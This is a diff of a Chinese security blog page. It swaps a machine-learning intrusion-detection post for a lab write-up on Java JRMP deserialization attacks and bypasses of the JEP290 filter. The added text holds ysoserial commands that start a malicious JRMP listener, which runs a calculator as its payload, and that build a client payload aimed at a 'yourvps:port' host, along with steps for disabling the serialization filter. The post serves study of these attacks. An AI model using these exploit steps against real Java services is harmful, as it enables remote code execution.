@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="machine learn,paper," />
+  <meta name="keywords" content="web,java," />
 
 
 
@@ -79,19 +79,25 @@
 
 
 
-<meta name="description" content="前言复现论文，初步了解机器学习，以及一些常见Python包的用法。 NSL-KDD数据集介绍NSL-KDD是一个网络流量数据集，经常用于IDS（入侵检测系统）模型的训练。 NSL-KDD主要有以下几个子集：KDDTest+, KDDTest-21, KDDTrain+, KDDTrain+_20Percent, KDDTest-21 和 KDDTrain+_20Percent。 其中KDDTrai">
+<meta name="description" content="关于jrmp攻击思路的分析，主要分析了利用jrmp协议攻击注册端的思路，并分析对JEP290的绕过和防御。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="论文复现1">
-<meta property="og:url" content="http://www.star123.top/2019/11/17/%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B01/index.html">
+<meta property="og:title" content="jrmp攻击思路分析">
+<meta property="og:url" content="http://www.star123.top/2021/04/05/jrmp%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="star&#39;s blog">
-<meta property="og:description" content="前言复现论文，初步了解机器学习，以及一些常见Python包的用法。 NSL-KDD数据集介绍NSL-KDD是一个网络流量数据集，经常用于IDS（入侵检测系统）模型的训练。 NSL-KDD主要有以下几个子集：KDDTest+, KDDTest-21, KDDTrain+, KDDTrain+_20Percent, KDDTest-21 和 KDDTrain+_20Percent。 其中KDDTrai">
+<meta property="og:description" content="关于jrmp攻击思路的分析，主要分析了利用jrmp协议攻击注册端的思路，并分析对JEP290的绕过和防御。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2019-11-17T03:07:00.000Z">
-<meta property="article:modified_time" content="2019-11-17T06:45:36.714Z">
+<meta property="og:image" content="https://i.loli.net/2021/04/06/wp6TPJBtlvuhmkA.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/06/RKN3McXC1DnPyj7.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/06/L3dQUq6ROxvtu2C.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/06/sJoBu2YSD1k4etF.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/06/3TiQpet2fsX9Kro.png">
+<meta property="article:published_time" content="2021-04-05T07:01:29.000Z">
+<meta property="article:modified_time" content="2021-04-07T06:44:30.113Z">
 <meta property="article:author" content="star">
-<meta property="article:tag" content="machine learn">
-<meta property="article:tag" content="paper">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/06/wp6TPJBtlvuhmkA.png">
 
 
 
@@ -121,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://www.star123.top/2019/11/17/论文复现1/"/>
+  <link rel="canonical" href="http://www.star123.top/2021/04/05/jrmp攻击思路分析/"/>
 
 
 
 
 
-  <title>论文复现1 | star's blog</title>
+  <title>jrmp攻击思路分析 | star's blog</title>
   
 
 
@@ -234,7 +240,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2019/11/17/%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B01/">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2021/04/05/jrmp%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="star">
@@ -251,7 +257,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">论文复现1</h1>
+          <h1 class="post-title" itemprop="name headline">jrmp攻击思路分析</h1>
         
 
         <div class="post-meta">
@@ -263,8 +269,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-17T11:07:00+08:00">
-                2019-11-17
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-04-05T15:01:29+08:00">
+                2021-04-05
               </time>
             
 
@@ -301,100 +307,54 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现论文，初步了解机器学习，以及一些常见Python包的用法。</p>
-<h2 id="NSL-KDD数据集介绍"><a href="#NSL-KDD数据集介绍" class="headerlink" title="NSL-KDD数据集介绍"></a>NSL-KDD数据集介绍</h2><p>NSL-KDD是一个网络流量数据集，经常用于IDS（入侵检测系统）模型的训练。</p>
-<p>NSL-KDD主要有以下几个子集：KDDTest+, KDDTest-21, KDDTrain+, KDDTrain+_20Percent, KDDTest-21 和 KDDTrain+_20Percent。</p>
-<p>其中KDDTrain+和KDDTest+是完整的数据集，而KDDTest-21是去除score 21数据的测试数据集。</p>
-<p>NSL-KDD中的数据总共包括了43个特征，其中41个和流量数据本身有关，剩下的两个一个是标签，标记流量类型（普通或者攻击），还有评分。</p>
-<p>NSL-KDD数据中的攻击类型总共有4类，Dos（拒绝服务），Probe（探针），U2R（普通用户越权行为），R2L（远程请求本地）。其中以Dos攻击的流量居多，而U2R和R2L非常少。</p>
-<p>详细的特征描述可以参考这篇文章：<br><a href="https://docs.google.com/spreadsheets/d/1oAx320Vo9Z6HrBrL6BcfLH6sh2zIk9EKCv2OlaMGmwY/edit?usp=sharing" target="_blank" rel="noopener">https://docs.google.com/spreadsheets/d/1oAx320Vo9Z6HrBrL6BcfLH6sh2zIk9EKCv2OlaMGmwY/edit?usp=sharing</a></p>
-<h2 id="论文复现"><a href="#论文复现" class="headerlink" title="论文复现"></a>论文复现</h2><h3 id="论文介绍"><a href="#论文介绍" class="headerlink" title="论文介绍"></a>论文介绍</h3><p>A Subset Feature Elimination Mechanism for Intrusion Detection System</p>
-<p>这是一篇实验性质的文章，文章最大的贡献是改进了训练算法采用了RFE来减少不重要的特征，通过以NSL-KDD数据集为样本的训练，最后将恶意流量识别的准确率从98%提高到了99%。</p>
-<h3 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h3><ol>
-<li><p>首先是数据处理</p>
-<ul>
-<li><p>读取csv文件中的数据</p>
-</li>
-<li><p>为了让模型能够更好地进行拟合(模型容易处理数字型数据)，将数据的分类特征转化为二进制表示特征。处理方式是将分类特征先转为数字，然后再用0，1来表示这些数字。</p>
-</li>
-<li><p>最后用生成的84个属性来替换一开始用文字表示的3个属性字段。(flag,protocol_type,service)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">df_categorical_values_enc=df_categorical_values.apply(LabelEncoder().fit_transform)</span><br><span class="line"></span><br><span class="line">enc = OneHotEncoder()</span><br><span class="line">df_categorical_values_encenc = enc.fit_transform(df_categorical_values_enc)</span><br></pre></td></tr></table></figure>
+        <p>关于jrmp攻击思路的分析，主要分析了利用jrmp协议攻击注册端的思路，并分析对JEP290的绕过和防御。</p>
+<a id="more"></a>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(newdf.shape)</span><br><span class="line">print(newdf_test.shape)</span><br><span class="line"></span><br><span class="line">(125973, 123)</span><br><span class="line">(22544, 123)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>特征扩展</p>
-<ul>
-<li>将处理好的数据分成标签和标签对应的数据两部分</li>
-<li>对应数据标准化(不是特别理解为啥要这么做)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X_U2R = U2R_df.drop(<span class="string">'label'</span>,<span class="number">1</span>)</span><br><span class="line">scaler4 = preprocessing.StandardScaler().fit(X_U2R)</span><br><span class="line">X_U2R.std(axis=<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>特征提取</p>
-<ul>
-<li>这里是这篇文章的重点，文中用了ANOVA F-test算法做特征评分，为后面特征按评分排序做准备。</li>
-<li>使用RFE挑选出需要的特征（这里不明白评分13个特征，再选13个特征有何意义）</li>
-</ul>
-</li>
-<li><p>使用classifyer训练模型</p>
-<p>这里我尝试了XGBClassifier和决策树，不带任何调参的XGB不仅慢而且准确率不高。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clf&#x3D;new xxxClassifier()</span><br><span class="line">clf.fix(labels,data)</span><br></pre></td></tr></table></figure></li>
-<li><p>评估<br>混淆矩阵，精确度等等</p>
-<ul>
-<li><p>评估标准</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JRMP协议是java rmi机制的一种实现，在JRMP协议交互中涉及序列化和反序列化对象，因此在某些情况下可以用于反序列化漏洞的利用。主要的内容主要有两方面，第一块是建立JRMP客户端去和恶意的JRMP服务端通信，另外一块是建立JRMP服务端去和恶意的JRMP客户端通信。JEP290主要用于针对java反序列化漏洞的防御，主要通过对反序列化流程中限制反序列化的目标类，反序列化的深度以及rmi调用时远程对象的类型等方面对反序列化漏洞进行防御。然而JRMP攻击方式可以通过伪造<strong>UnicastRef</strong>对象来建立和恶意JRMP服务端的连接，利用DGC的反序列化机制来绕过JEP290，jdk高本版因此也对DGC机制做了一些限制。</p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Jdk8u211，ysoserial，common collection 3.2依赖</p>
+<h2 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h2><h3 id="恶意JRMP服务端攻击JRMP客户端"><a href="#恶意JRMP服务端攻击JRMP客户端" class="headerlink" title="恶意JRMP服务端攻击JRMP客户端"></a>恶意JRMP服务端攻击JRMP客户端</h3><p>使用的payload主要是ysoserial的payload/JRMPClient，攻击的原理主要如下：</p>
 <ol>
-<li><p>准确性 Accuracy，判断成功的概率</p>
-</li>
-<li><p>精确性 precision，判断为真的中有多少确实是真的</p>
-</li>
-<li><p>召回率 recall，确实是真的部分有多少比例是确实被判断出来了</p>
-</li>
-<li><p>F1值  F1-score 综合考虑 精确度和召回率 2<em>precision</em>recall / (precision + recall)</p>
-</li>
+<li>反序列化JRMPClient发起对JRMP服务端的Call连接。</li>
+<li>JRMP服务端返回恶意远程对象。</li>
+<li>DGC发起dirtyCall，直接反序列化恶意对象。</li>
 </ol>
-</li>
-<li><p>混淆矩阵的四个角</p>
+<p>启动恶意监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener port CommonsCollections10 <span class="string">"open -a Calculator"</span></span><br></pre></td></tr></table></figure>
+
+<p>生成client的序列化数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient <span class="string">"yourvps:port"</span> &gt;&gt; test2.ser</span><br></pre></td></tr></table></figure>
+
+
+
+<p>测试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">        InputStream ins=<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"/Users/wanghuidi/Desktop/security_learning/tools/ysoserial/test2.ser"</span>));</span><br><span class="line">        ObjectInputStream obj=<span class="keyword">new</span> ObjectInputStream(ins);</span><br><span class="line">        Object o=obj.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<strong>exec</strong>下断点，代码直接跑</p>
+<p><img src="https://i.loli.net/2021/04/06/wp6TPJBtlvuhmkA.png" alt="image-20210406154444504"></p>
+<p>在反序列化<strong>LiveRef</strong>的时候，会尝试注册远程ref</p>
+<p><img src="https://i.loli.net/2021/04/06/RKN3McXC1DnPyj7.png" alt="image-20210406154848595"></p>
+<p>在这个过程中将发起一个dirtyCall的请求，请求租用(Lease)的远程对象的引用，这个过程最终会反序列化被伪造的<strong>UnicastRef</strong>对象，而其中包含着构造的恶意对象。这个伪造过程主要通过动态代理来实现，借助的handler是<strong>RemoteObjectInvocationHandler</strong>。</p>
+<p>尽管存在JEP290，但是JEP290默认没有对JRMP客户端的反序列化做限制，所以可以打得通。</p>
+<h3 id="恶意JRMP客户端攻击JRMP服务端"><a href="#恶意JRMP客户端攻击JRMP服务端" class="headerlink" title="恶意JRMP客户端攻击JRMP服务端"></a>恶意JRMP客户端攻击JRMP服务端</h3><p>使用的payload主要是ysoserial的payload/JRMPListener，其实主要的攻击原理和上面的类似，就是起个恶意JRMP服务给JRMP客户端来打，这里反序列化得到的是JRMP服务端。</p>
+<p>不过因为JEP290所以这个payload是没法打的。因为JEP290对Register层做了过滤。</p>
+<p>如图设置了serialFilter，这里为了实验需要，将serialFilter置空。</p>
+<p><img src="https://i.loli.net/2021/04/06/L3dQUq6ROxvtu2C.png" alt="image-20210406212700650"></p>
+<p>然后跟一下链。</p>
+<p><img src="https://i.loli.net/2021/04/06/sJoBu2YSD1k4etF.png" alt="image-20210406213004184"></p>
+<p>这里JRMP服务端中的DGC模块直接接收客户端打过来的序列化数据，因为第一个数据就有readObject方法调用所以不需要封装发过去的数据，直接将payload序列化数据写入Message中即可。</p>
+<p><img src="https://i.loli.net/2021/04/06/3TiQpet2fsX9Kro.png" alt="image-20210406213428007"></p>
+<h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h3><p>主要针对4个点</p>
 <ol>
-<li>TP TN</li>
-<li>FP（假判定真），FN（真判定假）</li>
+<li>黑白名单结合对反序列化的类进行检测，需要注意的是因为UnicastRef类在白名单内，JRMP客户端的payload可以用来连恶意的服务端。</li>
+<li>检测反序列化链的深度</li>
+<li>在rmi过程中提供了调用对象提供了一个验证类的机制</li>
+<li>过滤内容可被配置</li>
 </ol>
-</li>
-<li><p>k-fold cross-validation</p>
-<p>将数据集随机分为k份，该份为测试集，其余的部分为训练集，记录错误概率，重复该过程k次，每次采用不同的集合验证，取误差最小的那个模型</p>
-</li>
-<li><p>结果</p>
-<ol>
-<li><p>10 cv (决策树分类器)</p>
-<ul>
-<li><p>Dos 0.99697 (+/- 0.00265)</p>
-</li>
-<li><p>Probe  0.99151 (+/- 0.00595)</p>
-</li>
-<li><p>R2L 0.97451 (+/- 0.00906)</p>
-</li>
-<li><p>U2R Accuracy: 0.99622 (+/- 0.00378)</p>
-</li>
-</ul>
-</li>
-<li><p>10 cv(xboost分类器)</p>
-<ul>
-<li><p>Dos 0.99563 (+/- 0.00404)</p>
-</li>
-<li><p>Probe 0.98978 (+/- 0.00644)</p>
-</li>
-<li><p>L2U 0.97237 (+/- 0.01112)</p>
-</li>
-<li><p>U2R 0.99611 (+/- 0.00271)</p>
-</li>
-</ul>
-</li>
+<h3 id="Bypass-JEP290"><a href="#Bypass-JEP290" class="headerlink" title="Bypass JEP290"></a>Bypass JEP290</h3><ol>
+<li>jrmp服务端打jrmp客户端</li>
+<li>An Trinh的RMI注册端的Bypass方法</li>
 </ol>
-</li>
-</ul>
-</li>
-</ol>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总得来说这篇文章做得比较急，而且之前完全没有了解过机器学习，还是有很多要改进的地方，比如可以试试多个classifier，试试集成学习，自己尝试修改参数等等。</p>
-<p>感觉下来做这样一个实验主要是这样一个流程：首先将数据处理成模型容易跑的格式，（one-Hot encode）,然后再对特征进行处理，可以进行选择，挑选出比较重要的特征，然后再选择一个比较合适的分类器进行建模训练，然后就是根据结果修改参数，直到找到满意的模型。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这周简单地复现了利用JRMP的两种攻击方式，了解了JEP290的原理，下周计划系统的写一写rmi的内容。</p>
 
       
     </div>
@@ -412,9 +372,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/machine-learn/" rel="tag"># machine learn</a>
+            <a href="/tags/web/" rel="tag"># web</a>
           
-            <a href="/tags/paper/" rel="tag"># paper</a>
+            <a href="/tags/java/" rel="tag"># java</a>
           
         </div>
       
@@ -427,8 +387,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/14/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/" rel="next" title="命令注入初步">
-                <i class="fa fa-chevron-left"></i> 命令注入初步
+              <a href="/2021/03/28/fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="next" title="fastjson漏洞复现">
+                <i class="fa fa-chevron-left"></i> fastjson漏洞复现
               </a>
             
           </div>
@@ -436,10 +396,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/11/17/xyhcms1.5%E5%AE%A1%E8%AE%A1/" rel="prev" title="xyhcms1_5审计">
-                xyhcms1_5审计 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -562,7 +518,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NSL-KDD数据集介绍"><span class="nav-number">2.</span> <span class="nav-text">NSL-KDD数据集介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#论文复现"><span class="nav-number">3.</span> <span class="nav-text">论文复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#论文介绍"><span class="nav-number">3.1.</span> <span class="nav-text">论文介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验流程"><span class="nav-number">3.2.</span> <span class="nav-text">实验流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境"><span class="nav-number">2.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验流程"><span class="nav-number">3.</span> <span class="nav-text">实验流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#恶意JRMP服务端攻击JRMP客户端"><span class="nav-number">3.1.</span> <span class="nav-text">恶意JRMP服务端攻击JRMP客户端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#恶意JRMP客户端攻击JRMP服务端"><span class="nav-number">3.2.</span> <span class="nav-text">恶意JRMP客户端攻击JRMP服务端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JEP290"><span class="nav-number">3.3.</span> <span class="nav-text">JEP290</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-JEP290"><span class="nav-number">3.4.</span> <span class="nav-text">Bypass JEP290</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
